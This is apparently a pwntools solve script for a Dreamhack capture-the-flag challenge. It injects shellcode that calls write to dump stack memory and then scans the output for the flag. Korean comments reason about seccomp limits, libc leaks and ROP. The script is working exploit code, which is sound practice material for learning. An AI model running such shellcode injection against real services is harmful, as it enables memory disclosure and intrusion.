from pwn import *

context.binary = elf = ELF("./main")
context.arch = "amd64"
context.log_level = "debug"
libc = ELF('./libc.so.6')

def slog(n, a): return success(': '.join([n, hex(a)]))

# write(), read(), sigreturn() 같은 애만 사용 가능한 것으로 확인(prctl)
# 일단 write로 

HOST, PORT = 'host3.dreamhack.games 18233'.split()

if args.REMOTE:
    p = remote(HOST, PORT)
else:
    p = remote("localhost", 80)

sc = r'''
    mov rdi, 1
    lea rsi, [rbp-0x1000]
    mov rdx, 0x1000
    mov rax, 1
    syscall
'''

# sc = shellcraft.write(1, 'rsp', 0x1000)
# sc += shellcraft.read(0, 'rsp', 0x100)
sc = asm(sc)
p.sendafter(b'Prepare your spell!\n> ', sc)

p.recvuntil(b'And now...Presto!\n')
# p.recv(8*4)
# lb = u64(p.recvn(8))
# slog("leak libc", lb)
# lb = lb - 0x2a1ca
# slog("libc_base", lb)
# 풀려면 environ, rsp/rbp로 v2 위치 계산으로 풀 수 있을듯

dump = p.recvall()

idx = dump.find(b'DH{')
if idx != -1:
    print(idx)
    print(dump[idx:])
else:
    print("failed")

# 이걸로 ROP? 하지만 어떻게?
# sigreturn은 허용되지만 execve가 허용되지 않을 거고, 그럼 뭘 할 수 있지?
# 설마 그냥 덤프 따기??


p.interactive()